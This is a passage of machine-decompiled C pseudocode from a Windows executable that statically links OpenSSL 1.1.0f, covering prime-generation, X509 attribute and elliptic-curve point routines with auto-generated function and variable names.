    v9 = -1;
LABEL_61:
    sub_140027B60((__int64)v6);
    if ( !a3 )
      sub_140027BE0((__int64)v6);
  }
LABEL_63:
  sub_14003C3A0(v20);
  return v9;
}
// 1400AE526: conditional instruction was optimized away because rbp.8!=0

//----- (00000001400AE570) ----------------------------------------------------
__int64 __fastcall sub_1400AE570(__int64 a1, int a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v9; // r15d
  _QWORD *v10; // rsi
  unsigned __int16 *i; // rbx
  unsigned __int64 v13; // rax

  v9 = 0;
  sub_140027D40(a5);
  v10 = sub_140027C40(a5);
  if ( v10
    && (unsigned int)sub_1400282E0(a1, a2, 0, 1)
    && (unsigned int)sub_140041D70(0i64, (__int64)v10, a1, a3, a5)
    && (unsigned int)sub_140041AC0(a1, a1, (__int64)v10) )
  {
    if ( a4 ? sub_140041A10(a1, a1, a4) : (unsigned int)sub_14003E600(a1, 1ui64) )
    {
      while ( 2 )
      {
        for ( i = (unsigned __int16 *)&unk_14011C982; ; ++i )
        {
          if ( (__int64)i >= (__int64)&unk_14011D980 )
          {
            v9 = 1;
            goto LABEL_17;
          }
          v13 = sub_14003E820(a1, *i);
          if ( v13 == -1i64 )
            goto LABEL_17;
          if ( v13 <= 1 )
            break;
        }
        if ( (unsigned int)sub_140041A10(a1, a1, a3) )
          continue;
        break;
      }
    }
  }
LABEL_17:
  sub_140027B60((__int64)a5);
  return v9;
}

//----- (00000001400AE6B0) ----------------------------------------------------
__int64 __fastcall sub_1400AE6B0(_DWORD *a1, int a2, __int64 a3)
{
  unsigned __int64 v6; // rbp
  __int64 v7; // rdi
  char *v8; // rsi
  _WORD *v9; // rbx
  __int64 v10; // rax
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // rbx
  unsigned __int64 v13; // r10
  unsigned __int16 *v14; // rcx
  int i; // r8d
  unsigned __int64 v16; // r9
  unsigned __int16 *j; // rcx
  bool v19; // [rsp+58h] [rbp+10h]

  v19 = a2 <= 64;
  v6 = -17864i64;
LABEL_2:
  if ( (unsigned int)sub_1400282E0((__int64)a1, a2, 1, 1) )
  {
    v7 = 1i64;
    v8 = (char *)&unk_14011C980 - a3;
    v9 = (_WORD *)(a3 + 2);
    while ( 1 )
    {
      v10 = sub_14003E820((__int64)a1, *(unsigned __int16 *)((char *)v9 + (_QWORD)v8));
      if ( v10 == -1 )
        break;
      *v9 = v10;
      ++v7;
      ++v9;
      if ( v7 >= 2048 )
      {
        if ( a2 <= 64 )
        {
          if ( a2 == 64 )
            v11 = -1 - sub_140027080(a1);
          else
            v11 = (1i64 << a2) - sub_140027080(a1) - 1;
          if ( v11 < v6 )
            v6 = v11;
        }
        v12 = 0i64;
LABEL_13:
        if ( v19 )
        {
          v13 = sub_140027080(a1);
          v14 = (unsigned __int16 *)(a3 + 2);
          for ( i = 1; i < 2048; ++i )
          {
            v16 = *(unsigned __int16 *)&v8[(_QWORD)v14];
            if ( v16 >= v13 )
              break;
            if ( !((v12 + *v14) % v16) )
              goto LABEL_19;
            ++v14;
          }
        }
        else
        {
          for ( j = (unsigned __int16 *)&unk_14011C982; (__int64)j < (__int64)&unk_14011D980; ++j )
          {
            if ( (v12 + *(unsigned __int16 *)((char *)j + a3 - (_QWORD)&unk_14011C982 + 2)) % *j <= 1 )
            {
LABEL_19:
              v12 += 2i64;
              if ( v12 <= v6 )
                goto LABEL_13;
              goto LABEL_2;
            }
          }
        }
        if ( !(unsigned int)sub_14003E600((__int64)a1, v12) )
          return 0i64;
        if ( (unsigned int)sub_140027260((__int64)a1) != a2 )
          goto LABEL_2;
        return 1i64;
      }
    }
  }
  return 0i64;
}

//----- (00000001400AE860) ----------------------------------------------------
__int64 __fastcall sub_1400AE860(__int64 a1, int a2, __int64 a3, __int64 a4, int *a5)
{
  _QWORD *v9; // rbx
  _QWORD *v10; // rsi
  _QWORD *v11; // rax
  __int64 v12; // r15
  int v13; // eax
  unsigned __int16 *i; // rbx
  __int64 v15; // rdi
  __int64 v16; // rax
  unsigned int v18; // [rsp+68h] [rbp+10h]

  v18 = 0;
  sub_140027D40(a5);
  v9 = sub_140027C40(a5);
  v10 = sub_140027C40(a5);
  v11 = sub_140027C40(a5);
  v12 = (__int64)v11;
  if ( v11
    && (unsigned int)sub_140047230((__int64)v11, a3)
    && (unsigned int)sub_1400282E0((__int64)v10, a2 - 1, 0, 1)
    && (unsigned int)sub_140041D70(0i64, (__int64)v9, (__int64)v10, v12, a5)
    && (unsigned int)sub_140041AC0((__int64)v10, (__int64)v10, (__int64)v9) )
  {
    if ( a4 )
    {
      if ( !(unsigned int)sub_140047230((__int64)v9, a4) )
        goto LABEL_24;
      v13 = sub_140041A10((__int64)v10, (__int64)v10, (__int64)v9);
    }
    else
    {
      v13 = sub_14003E600((__int64)v10, 1ui64);
    }
    if ( v13 && (unsigned int)sub_140046FD0(a1, (__int64)v10) && (unsigned int)sub_14003E600(a1, 1ui64) )
    {
      do
      {
        for ( i = (unsigned __int16 *)&unk_14011C982; ; ++i )
        {
          if ( (__int64)i >= (__int64)&unk_14011D980 )
          {
            v18 = 1;
            goto LABEL_24;
          }
          v15 = sub_14003E820(a1, *i);
          v16 = sub_14003E820((__int64)v10, *i);
          if ( v15 == -1 || v16 == -1 )
            goto LABEL_24;
          if ( !v15 || !v16 )
            break;
        }
      }
      while ( (unsigned int)sub_140041A10(a1, a1, a3) && (unsigned int)sub_140041A10((__int64)v10, (__int64)v10, v12) );
    }
  }
LABEL_24:
  sub_140027B60((__int64)a5);
  return v18;
}

//----- (00000001400AEA40) ----------------------------------------------------
__int64 __fastcall sub_1400AEA40(__int64 a1, unsigned __int64 a2, __int64 *a3, __int64 a4, int a5, int *a6, __int64 a7)
{
  int v11; // edi

  if ( !(unsigned int)sub_14007BDF0(a1, a1, a4, a2, a6, a7) )
    return 0xFFFFFFFFi64;
  if ( sub_140027110(a1) || !(unsigned int)sub_140026AB0(a1, a3) )
    return 0i64;
  v11 = a5 - 1;
  if ( a5 == 1 )
    return 1i64;
  while ( (unsigned int)sub_140079710(a1, a1, a1, a2, a6) )
  {
    if ( sub_140027110(a1) )
      return 1i64;
    if ( !(unsigned int)sub_140026AB0(a1, a3) )
      return 0i64;
    if ( !--v11 )
      return 1i64;
  }
  return 0xFFFFFFFFi64;
}

//----- (00000001400AEB30) ----------------------------------------------------
unsigned int *__fastcall sub_1400AEB30(unsigned int **a1, unsigned int a2, int a3, char *a4, int a5)
{
  char **v8; // rbx
  unsigned int *v10; // rdi

  v8 = sub_14002C0F0(a2);
  if ( v8 )
  {
    v10 = sub_1400AEBD0(a1, (__int64)v8, a3, a4, a5);
    if ( !v10 )
      sub_14003F4D0((__int64)v8);
    return v10;
  }
  else
  {
    sub_140024610(11, 136, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_att.c", 177);
    return 0i64;
  }
}

//----- (00000001400AEBD0) ----------------------------------------------------
unsigned int *__fastcall sub_1400AEBD0(unsigned int **a1, __int64 a2, int a3, char *a4, int a5)
{
  unsigned int *v9; // rbx
  __int64 v10; // rax

  if ( !a1 || (v9 = *a1) == 0i64 )
  {
    v9 = (unsigned int *)sub_14002DE90();
    if ( !v9 )
    {
      sub_140024610(11, 137, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_att.c", 196);
      return 0i64;
    }
  }
  if ( !a2
    || (sub_14003F4D0(*(_QWORD *)v9), v10 = sub_140047B90(a2), (*(_QWORD *)v9 = v10) == 0i64)
    || !(unsigned int)sub_1400AECF0((__int64)v9, a3, a4, a5) )
  {
    if ( !a1 || v9 != *a1 )
      sub_14002DE60(v9);
    return 0i64;
  }
  if ( a1 )
  {
    if ( !*a1 )
      *a1 = v9;
  }
  return v9;
}

//----- (00000001400AECC0) ----------------------------------------------------
__int64 __fastcall sub_1400AECC0(__int64 a1, int a2)
{
  if ( a1 )
    return sub_140029880(*(_QWORD *)(a1 + 8), a2);
  else
    return 0i64;
}

//----- (00000001400AECF0) ----------------------------------------------------
__int64 __fastcall sub_1400AECF0(__int64 a1, int a2, char *a3, int a4)
{
  unsigned int *v4; // rdi
  __int64 v5; // rbx
  int v6; // ebp
  int v12; // r15d
  int v13; // eax
  __int64 v14; // rax
  _DWORD *v15; // rax
  __int64 v16; // rax

  v4 = 0i64;
  v5 = 0i64;
  v6 = 0;
  if ( !a1 )
    return 0i64;
  v12 = a2 & 0x1000;
  if ( (a2 & 0x1000) == 0 )
  {
    if ( a4 != -1 )
    {
      v15 = sub_140047720(a2);
      v5 = (__int64)v15;
      if ( !v15 || !(unsigned int)sub_1400475D0((__int64)v15, a3, a4) )
        goto LABEL_21;
      v6 = a2;
    }
LABEL_11:
    if ( !a2 )
    {
      sub_140047500(v5);
      return 1i64;
    }
    v16 = sub_14004FF40();
    v4 = (unsigned int *)v16;
    if ( v16 )
    {
      if ( a4 != -1 || v12 )
      {
        sub_14003F350(v16, v6, v5);
        v5 = 0i64;
      }
      else if ( !(unsigned int)sub_14003F3C0(v16, a2, (__int64)a3) )
      {
        goto LABEL_21;
      }
      if ( (unsigned int)sub_1400297C0(*(int **)(a1 + 8), (__int64)v4) )
        return 1i64;
    }
LABEL_21:
    sub_140024610(11, 138, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_att.c", 290);
    sub_14004FF20(v4);
    sub_140047500(v5);
    return 0i64;
  }
  v13 = sub_14002C260(*(_QWORD *)a1);
  v14 = sub_1400B6EB0(0i64, a3, a4, a2, v13);
  v5 = v14;
  if ( v14 )
  {
    v6 = *(_DWORD *)(v14 + 4);
    goto LABEL_11;
  }
  sub_140024610(11, 138, 13, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_att.c", 257);
  return 0i64;
}

//----- (00000001400AEE60) ----------------------------------------------------
void **__fastcall sub_1400AEE60(void ***a1, unsigned int *a2)
{
  int v2; // eax
  unsigned int *v3; // rsi
  void **v6; // rbx
  __int64 v8; // rax

  v3 = 0i64;
  v6 = 0i64;
  if ( !a1 )
  {
    sub_140024610(v2 - 37, v2 + 87, v2 + 19, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_att.c", 80);
LABEL_3:
    sub_14002DE60(v3);
    sub_1400294B0(v6);
    return 0i64;
  }
  v6 = *a1;
  if ( !*a1 )
  {
    v6 = (void **)sub_1400296C0();
    if ( !v6 )
      goto LABEL_8;
  }
  v8 = sub_14002DE40(a2);
  v3 = (unsigned int *)v8;
  if ( !v8 )
    goto LABEL_3;
  if ( !(unsigned int)sub_1400297C0((int *)v6, v8) )
  {
LABEL_8:
    sub_140024610(11, 135, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_att.c", 98);
    goto LABEL_3;
  }
  if ( !*a1 )
    *a1 = v6;
  return v6;
}
// 1400AEE9E: variable 'v2' is possibly undefined

//----- (00000001400AEF30) ----------------------------------------------------
unsigned int *__fastcall sub_1400AEF30(void ***a1, unsigned int a2, int a3, char *a4, int a5)
{
  unsigned int *result; // rax
  unsigned int *v7; // rdi
  void **v8; // rbx

  result = sub_1400AEB30(0i64, a2, a3, a4, a5);
  v7 = result;
  if ( result )
  {
    v8 = sub_1400AEE60(a1, result);
    sub_14002DE60(v7);
    return (unsigned int *)v8;
  }
  return result;
}

//----- (00000001400AEF90) ----------------------------------------------------
__int64 __fastcall sub_1400AEF90(unsigned int *a1)
{
  return sub_1400296E0(a1);
}

//----- (00000001400AEFB0) ----------------------------------------------------
__int64 __fastcall sub_1400AEFB0(__int64 a1)
{
  _DWORD *v2; // rax
  _DWORD *v3; // rcx

  *(_QWORD *)(a1 + 64) = sub_140027200();
  *(_QWORD *)(a1 + 96) = sub_140027200();
  v2 = sub_140027200();
  v3 = *(_DWORD **)(a1 + 64);
  *(_QWORD *)(a1 + 104) = v2;
  if ( v3 && *(_QWORD *)(a1 + 96) && v2 )
  {
    *(_DWORD *)(a1 + 112) = 0;
    return 1i64;
  }
  else
  {
    sub_140026FF0(v3);
    sub_140026FF0(*(_DWORD **)(a1 + 96));
    sub_140026FF0(*(_DWORD **)(a1 + 104));
    return 0i64;
  }
}

//----- (00000001400AF030) ----------------------------------------------------
void __fastcall sub_1400AF030(__int64 **a1)
{
  sub_140026A10(a1[8]);
  sub_140026A10(a1[12]);
  sub_140026A10(a1[13]);
}

//----- (00000001400AF070) ----------------------------------------------------
__int64 __fastcall sub_1400AF070(__int64 a1, __int64 a2)
{
  if ( !sub_140026E90(*(_QWORD *)(a1 + 64), *(_QWORD *)(a2 + 64))
    || !sub_140026E90(*(_QWORD *)(a1 + 96), *(_QWORD *)(a2 + 96))
    || !sub_140026E90(*(_QWORD *)(a1 + 104), *(_QWORD *)(a2 + 104)) )
  {
    return 0i64;
  }
  *(_DWORD *)(a1 + 112) = *(_DWORD *)(a2 + 112);
  return 1i64;
}

//----- (00000001400AF0F0) ----------------------------------------------------
int *__fastcall sub_1400AF0F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v6; // r14d
  __int64 v7; // rbp
  int *v11; // rdi
  int *result; // rax
  _QWORD *v13; // rsi
  unsigned int (__fastcall *v14)(__int64, _QWORD, _QWORD *, int *); // r10
  bool v15; // zf
  unsigned int (__fastcall *v16)(__int64, _QWORD, _QWORD, int *); // r10

  v6 = 0;
  v7 = 0i64;
  if ( (int)sub_140027260(a2) > 2 && sub_1400270F0(a2) )
  {
    v11 = a5;
    if ( a5 || (result = (int *)sub_140027CD0(), v7 = (__int64)result, (v11 = result) != 0i64) )
    {
      sub_140027D40(v11);
      v13 = sub_140027C40(v11);
      if ( v13 )
      {
        if ( sub_140026E90(*(_QWORD *)(a1 + 64), a2) )
        {
          sub_140027540(*(_QWORD *)(a1 + 64), 0);
          if ( (unsigned int)sub_1400798F0((__int64)v13, a3, a2, v11) )
          {
            v14 = *(unsigned int (__fastcall **)(__int64, _QWORD, _QWORD *, int *))(*(_QWORD *)a1 + 288i64);
            if ( v14 )
              v15 = v14(a1, *(_QWORD *)(a1 + 96), v13, v11) == 0;
            else
              v15 = sub_140026E90(*(_QWORD *)(a1 + 96), (__int64)v13) == 0i64;
            if ( !v15 )
            {
              if ( (unsigned int)sub_1400798F0(*(_QWORD *)(a1 + 104), a4, a2, v11) )
              {
                v16 = *(unsigned int (__fastcall **)(__int64, _QWORD, _QWORD, int *))(*(_QWORD *)a1 + 288i64);
                if ( !v16 || v16(a1, *(_QWORD *)(a1 + 104), *(_QWORD *)(a1 + 104), v11) )
                {
                  if ( (unsigned int)sub_14003E600((__int64)v13, 3ui64) )
                  {
                    LOBYTE(v6) = (unsigned int)sub_140026AB0((__int64)v13, *(__int64 **)(a1 + 64)) == 0;
                    *(_DWORD *)(a1 + 112) = v6;
                    v6 = 1;
                  }
                }
              }
            }
          }
        }
      }
      sub_140027B60((__int64)v11);
      sub_140027BE0(v7);
      return (int *)v6;
    }
  }
  else
  {
    sub_140024610(16, 166, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_smpl.c", 143);
    return 0i64;
  }
  return result;
}

//----- (00000001400AF2C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400AF2C0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  unsigned int v5; // r15d
  __int64 v9; // r14
  _QWORD *result; // rax
  __int64 v11; // rbp
  bool v12; // zf

  v5 = 0;
  v9 = 0i64;
  if ( !a2 || (result = sub_140026E90(a2, a1[8])) != 0i64 )
  {
    if ( !a3 && !a4 )
      goto LABEL_17;
    if ( !*(_QWORD *)(*a1 + 296) )
    {
      if ( a3 && !sub_140026E90(a3, a1[12]) )
        goto LABEL_18;
      if ( !a4 )
        goto LABEL_17;
      v12 = sub_140026E90(a4, a1[13]) == 0i64;
      goto LABEL_16;
    }
    v11 = a5;
    if ( a5 || (result = sub_140027CD0(), v9 = (__int64)result, (v11 = (__int64)result) != 0) )
    {
      if ( a3
        && !(*(unsigned int (__fastcall **)(__int64 *, __int64, __int64, __int64))(*a1 + 296))(a1, a3, a1[12], v11) )
      {
        goto LABEL_18;
      }
      if ( !a4 )
        goto LABEL_17;
      v12 = (*(unsigned int (__fastcall **)(__int64 *, __int64, __int64, __int64))(*a1 + 296))(a1, a4, a1[13], v11) == 0;
LABEL_16:
      if ( v12 )
      {
LABEL_18:
        sub_140027BE0(v9);
        return (_QWORD *)v5;
      }
LABEL_17:
      v5 = 1;
      goto LABEL_18;
    }
  }
  return result;
}

//----- (00000001400AF3E0) ----------------------------------------------------
__int64 __fastcall sub_1400AF3E0(__int64 a1)
{
  return sub_140027260(*(_QWORD *)(a1 + 64));
}

//----- (00000001400AF400) ----------------------------------------------------
__int64 __fastcall sub_1400AF400(_QWORD *a1, int *a2)
{
  __int64 v2; // r13
  unsigned int v3; // r12d
  int *v4; // rbx
  int *v6; // rbp
  _QWORD *v7; // rsi
  _QWORD *v8; // r14
  __int64 *v9; // r15
  unsigned int (__fastcall *v10)(_QWORD *, _QWORD *, _QWORD, int *); // r10
  bool v11; // zf
  BOOL v12; // eax
  __int64 v13; // rcx
  _QWORD *v15; // [rsp+60h] [rbp+8h]

  v2 = a1[8];
  v3 = 0;
  v4 = a2;
  v6 = 0i64;
  if ( !a2 )
  {
    v6 = (int *)sub_140027CD0();
    v4 = v6;
    if ( !v6 )
    {
      sub_140024610(16, 165, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_smpl.c", 253);
      goto LABEL_24;
    }
  }
  sub_140027D40(v4);
  v7 = sub_140027C40(v4);
  v8 = sub_140027C40(v4);
  v15 = sub_140027C40(v4);
  v9 = sub_140027C40(v4);
  if ( sub_140027C40(v4) )
  {
    v10 = *(unsigned int (__fastcall **)(_QWORD *, _QWORD *, _QWORD, int *))(*a1 + 296i64);
    if ( v10 )
    {
      if ( !v10(a1, v7, a1[12], v4) )
        goto LABEL_22;
      v11 = (*(unsigned int (__fastcall **)(_QWORD *, _QWORD *, _QWORD, int *))(*a1 + 296i64))(a1, v8, a1[13], v4) == 0;
    }
    else
    {
      if ( !sub_140026E90((__int64)v7, a1[12]) )
        goto LABEL_22;
      v11 = sub_140026E90((__int64)v8, a1[13]) == 0i64;
    }
    if ( !v11 )
    {
      v12 = sub_140027160((__int64)v7);
      v13 = (__int64)v8;
      if ( v12 )
        goto LABEL_20;
      if ( sub_140027160((__int64)v8) )
      {
LABEL_21:
        v3 = 1;
        goto LABEL_22;
      }
      if ( (unsigned int)sub_1400797D0((__int64)v15, (__int64)v7, v2, v4)
        && (unsigned int)sub_140079710((__int64)v9, (__int64)v15, (__int64)v7, v2, v4)
        && (unsigned int)sub_140046E40((__int64)v15, v9, 2)
        && (unsigned int)sub_1400797D0((__int64)v9, (__int64)v8, v2, v4)
        && (unsigned int)sub_14003E8F0((__int64)v9, 0x1Bui64)
        && (unsigned int)sub_1400794E0((__int64)v7, (__int64)v15, (__int64)v9, v2, v4) )
      {
        v13 = (__int64)v7;
LABEL_20:
        if ( sub_140027160(v13) )
          goto LABEL_22;
        goto LABEL_21;
      }
    }
  }
LABEL_22:
  if ( v4 )
    sub_140027B60((__int64)v4);
LABEL_24:
  sub_140027BE0((__int64)v6);
  return v3;
}

//----- (00000001400AF620) ----------------------------------------------------
__int64 __fastcall sub_1400AF620(__int64 a1)
{
  _DWORD *v2; // rax
  _DWORD *v3; // rcx

  *(_QWORD *)(a1 + 8) = sub_140027200();
  *(_QWORD *)(a1 + 16) = sub_140027200();
  v2 = sub_140027200();
  v3 = *(_DWORD **)(a1 + 8);
  *(_QWORD *)(a1 + 24) = v2;
  *(_DWORD *)(a1 + 32) = 0;
  if ( v3 && *(_QWORD *)(a1 + 16) && v2 )
    return 1i64;
  sub_140026FF0(v3);
  sub_140026FF0(*(_DWORD **)(a1 + 16));
  sub_140026FF0(*(_DWORD **)(a1 + 24));
  return 0i64;
}

//----- (00000001400AF6A0) ----------------------------------------------------
int *__fastcall sub_1400AF6A0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, int *a6)
{
  int *v6; // rsi
  __int64 v7; // rbp
  unsigned int v12; // r12d
  int *result; // rax
  unsigned int (__fastcall *v14)(__int64 *, _QWORD, _QWORD, int *); // r10
  unsigned int (__fastcall *v15)(__int64 *, _QWORD, _QWORD, int *); // r10
  BOOL v16; // r14d
  __int64 (__fastcall *v17)(__int64 *, _QWORD, _QWORD, int *); // r10
  __int64 (__fastcall *v18)(__int64 *, _QWORD, int *); // rax
  int v19; // eax

  v6 = a6;
  v7 = 0i64;
  v12 = 0;
  if ( a6 || (result = (int *)sub_140027CD0(), v7 = (__int64)result, (v6 = result) != 0i64) )
  {
    if ( (!a3
       || (unsigned int)sub_1400798F0(*(_QWORD *)(a2 + 8), a3, a1[8], v6)
       && ((v14 = *(unsigned int (__fastcall **)(__int64 *, _QWORD, _QWORD, int *))(*a1 + 288)) == 0i64
        || v14(a1, *(_QWORD *)(a2 + 8), *(_QWORD *)(a2 + 8), v6)))
      && (!a4
       || (unsigned int)sub_1400798F0(*(_QWORD *)(a2 + 16), a4, a1[8], v6)
       && ((v15 = *(unsigned int (__fastcall **)(__int64 *, _QWORD, _QWORD, int *))(*a1 + 288)) == 0i64
        || v15(a1, *(_QWORD *)(a2 + 16), *(_QWORD *)(a2 + 16), v6))) )
    {
      if ( a5 )
      {
        if ( !(unsigned int)sub_1400798F0(*(_QWORD *)(a2 + 24), a5, a1[8], v6) )
          goto LABEL_21;
        v16 = sub_140027110(*(_QWORD *)(a2 + 24));
        v17 = *(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD, int *))(*a1 + 288);
        if ( v17 )
        {
          if ( v16 && (v18 = *(__int64 (__fastcall **)(__int64 *, _QWORD, int *))(*a1 + 304)) != 0i64 )
            v19 = v18(a1, *(_QWORD *)(a2 + 24), v6);
          else
            v19 = v17(a1, *(_QWORD *)(a2 + 24), *(_QWORD *)(a2 + 24), v6);
          if ( !v19 )
            goto LABEL_21;
        }
        *(_DWORD *)(a2 + 32) = v16;
      }
      v12 = 1;
    }
LABEL_21:
    sub_140027BE0(v7);
    return (int *)v12;
  }
  return result;
}

//----- (00000001400AF820) ----------------------------------------------------
_QWORD *__fastcall sub_1400AF820(__int64 a1, __int64 *a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v6; // rbx
  unsigned int v11; // r12d
  __int64 v12; // rdi
  _QWORD *result; // rax
  bool v14; // zf

  v6 = 0i64;
  v11 = 0;
  if ( !*(_QWORD *)(*(_QWORD *)a1 + 296i64) )
  {
    if ( a3 && !sub_140026E90(a3, a2[1]) || a4 && !sub_140026E90(a4, a2[2]) )
      goto LABEL_18;
    if ( !a5 )
      goto LABEL_17;
    v14 = sub_140026E90(a5, a2[3]) == 0i64;
LABEL_16:
    if ( v14 )
    {
LABEL_18:
      sub_140027BE0(v6);
      return (_QWORD *)v11;
    }
LABEL_17:
    v11 = 1;
    goto LABEL_18;
  }
  v12 = a6;
  if ( a6 || (result = sub_140027CD0(), v6 = (__int64)result, (v12 = (__int64)result) != 0) )
  {
    if ( a3
      && !(*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 296i64))(
            a1,
            a3,
            a2[1],
            v12)
      || a4
      && !(*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 296i64))(
            a1,
            a4,
            a2[2],
            v12) )
    {
      goto LABEL_18;
    }
    if ( !a5 )
      goto LABEL_17;
    v14 = (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 296i64))(
            a1,
            a5,
            a2[3],
            v12) == 0;
    goto LABEL_16;
  }
  return result;
}

//----- (00000001400AF960) ----------------------------------------------------
__int64 __fastcall sub_1400AF960(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  if ( a3 && a4 )
  {
    sub_140027650();
    return sub_140022770(a1, a2);
  }
  else
  {
    sub_140024610(16, 168, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_smpl.c", 486);
    return 0i64;
  }
}

//----- (00000001400AFA00) ----------------------------------------------------
int *__fastcall sub_1400AFA00(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4, int *a5)
{
  __int64 v5; // r15
  int *result; // rax
  int *v11; // rdi
  _QWORD *v12; // r12
  _QWORD *v13; // r13
  unsigned int (__fastcall *v14)(__int64 *, _QWORD *, _QWORD, int *); // r10
  unsigned int (__fastcall *v15)(__int64 *, __int64, _QWORD, int *); // r10
  int v16; // eax
  bool v17; // zf
  int v18; // eax
  int v19; // eax
  unsigned int v20; // [rsp+30h] [rbp-48h]
  _QWORD *v21; // [rsp+38h] [rbp-40h]
  _QWORD *v22; // [rsp+40h] [rbp-38h]

  v5 = 0i64;
  v20 = 0;
  if ( (unsigned int)sub_140022480((__int64)a1, a2) )
  {
    sub_140024610(16, 167, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_smpl.c", 506);
    return 0i64;
  }
  v11 = a5;
  if ( a5 || (result = (int *)sub_140027CD0(), v5 = (__int64)result, (v11 = result) != 0i64) )
  {
    sub_140027D40(v11);
    v12 = sub_140027C40(v11);
    v13 = sub_140027C40(v11);
    v21 = sub_140027C40(v11);
    v22 = sub_140027C40(v11);
    if ( !v22 )
      goto LABEL_37;
    v14 = *(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD, int *))(*a1 + 296);
    if ( v14 )
    {
      if ( !v14(a1, v12, a2[3], v11) )
        goto LABEL_37;
    }
    else
    {
      v12 = (_QWORD *)a2[3];
    }
    if ( sub_140027110((__int64)v12) )
    {
      v15 = *(unsigned int (__fastcall **)(__int64 *, __int64, _QWORD, int *))(*a1 + 296);
      if ( !v15 )
      {
        if ( a3 && !sub_140026E90(a3, a2[1]) )
          goto LABEL_37;
        if ( !a4 )
          goto LABEL_36;
        v17 = sub_140026E90(a4, a2[2]) == 0i64;
LABEL_35:
        if ( !v17 )
LABEL_36:
          v20 = 1;
LABEL_37:
        sub_140027B60((__int64)v11);
        sub_140027BE0(v5);
        return (int *)v20;
      }
      if ( a3 && !v15(a1, a3, a2[1], v11) )
        goto LABEL_37;
      if ( !a4 )
        goto LABEL_36;
      v16 = (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD, int *))(*a1 + 296))(a1, a4, a2[2], v11);
    }
    else
    {
      if ( !sub_14006FDD0(v13, (__int64)v12, (__int64 *)a1[8], v11) )
      {
        sub_140024610(16, 167, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_smpl.c", 557);
        goto LABEL_37;
      }
      if ( *(_QWORD *)(*a1 + 288) )
        v18 = sub_1400797D0((__int64)v21, (__int64)v13, a1[8], v11);
      else
        v18 = (*(__int64 (__fastcall **)(__int64 *, _QWORD *, _QWORD *, int *))(*a1 + 272))(a1, v21, v13, v11);
      if ( !v18
        || a3
        && !(*(unsigned int (__fastcall **)(__int64 *, __int64, _QWORD, _QWORD *, int *))(*a1 + 264))(
              a1,
              a3,
              a2[1],
              v21,
              v11) )
      {
        goto LABEL_37;
      }
      if ( !a4 )
        goto LABEL_36;
      if ( *(_QWORD *)(*a1 + 288) )
        v19 = sub_140079710((__int64)v22, (__int64)v21, (__int64)v13, a1[8], v11);
      else
        v19 = (*(__int64 (__fastcall **)(__int64 *, _QWORD *, _QWORD *, _QWORD *))(*a1 + 264))(a1, v22, v21, v13);
      if ( !v19 )
        goto LABEL_37;
      v16 = (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD, _QWORD *, int *))(*a1 + 264))(
              a1,
              a4,
              a2[2],
              v22,
              v11);
    }
    v17 = v16 == 0;
    goto LABEL_35;
  }
  return result;
}

//----- (00000001400AFCF0) ----------------------------------------------------
int *__fastcall sub_1400AFCF0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v5; // r12d
  int *result; // rax
  int v11; // eax
  _QWORD *v12; // rdx
  int *v13; // rdi
  unsigned int (__fastcall *v14)(_QWORD *, __int64 *, __int64 *, __int64 *, int *); // r13
  __int64 *v15; // rbx
  bool v16; // zf
  bool v17; // zf
  __int64 *v18; // r14
  bool v19; // zf
  bool v20; // zf
  __int64 *v21; // [rsp+30h] [rbp-78h]
  __int64 *v22; // [rsp+38h] [rbp-70h]
  __int64 *v23; // [rsp+40h] [rbp-68h]
  __int64 *v24; // [rsp+48h] [rbp-60h]
  unsigned int (__fastcall *v25)(_QWORD *, __int64 *, __int64 *, int *); // [rsp+50h] [rbp-58h]
  __int64 *v26; // [rsp+58h] [rbp-50h]
  __int64 v27; // [rsp+60h] [rbp-48h]
  __int64 *v28; // [rsp+C0h] [rbp+18h]
  __int64 *v29; // [rsp+C8h] [rbp+20h]

  v5 = 0;
  v27 = 0i64;
  if ( a3 == a4 )
    return (int *)sub_1400221E0((__int64)a1, (_QWORD *)a2, (_QWORD *)a3);
  v11 = sub_140022480((__int64)a1, (_QWORD *)a3);
  v12 = (_QWORD *)a4;
  if ( v11 )
    return (int *)sub_140022150((_QWORD *)a2, v12);
  if ( (unsigned int)sub_140022480((__int64)a1, (_QWORD *)a4) )
  {
    v12 = (_QWORD *)a3;
    return (int *)sub_140022150((_QWORD *)a2, v12);
  }
  v13 = a5;
  v14 = *(unsigned int (__fastcall **)(_QWORD *, __int64 *, __int64 *, __int64 *, int *))(*a1 + 264i64);
  v25 = *(unsigned int (__fastcall **)(_QWORD *, __int64 *, __int64 *, int *))(*a1 + 272i64);
  v22 = (__int64 *)a1[8];
  if ( a5 || (result = (int *)sub_140027CD0(), v27 = (__int64)result, (v13 = result) != 0i64) )
  {
    sub_140027D40(v13);
